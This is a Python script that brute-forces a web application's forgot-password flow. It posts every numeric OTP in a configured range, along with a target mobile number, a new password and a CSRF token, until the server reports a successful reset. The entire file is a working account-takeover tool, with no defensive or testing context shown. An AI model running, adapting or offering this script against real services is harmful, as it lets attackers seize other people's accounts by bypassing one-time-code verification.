import requests
import re
import config

def forgot_password(mobile, otp, password, cnf_password):
    data = {
        "mobile": mobile,
        "otp": otp,
        "password": password,
        "cnf_password": cnf_password,
        "_token": config.TOKEN
    }

    response = session.post(config.URL, data=data)

    if response.status_code == 200:
        if re.search(r"success", response.text):
            print("Password reset successful")
            return 1
        elif re.search(r"OTP Expired, Please Create new OTP!", response.text):
            print("Error: " , otp , "otp expired create new one.")
            return 3
        else:
            print("Error:", otp, response.text)
            return 2
    else:
        print("Error:", response.status_code)
        return 3

if __name__ == "__main__":
    session = requests.Session()
    mobile = config.MOBILE_NUMBER
    password = config.PASSWORD
    cnf_password = config.CNF_PASSWORD
    otp = config.R2

    while otp <= config.R3:
        try:
            result = forgot_password(mobile, otp, password, cnf_password)
            if result == 1:
                break
            elif result == 2:
                otp += 1
            else:
                continue
        except Exception as e:
            print(f"Error for OTP {otp}: {e}")
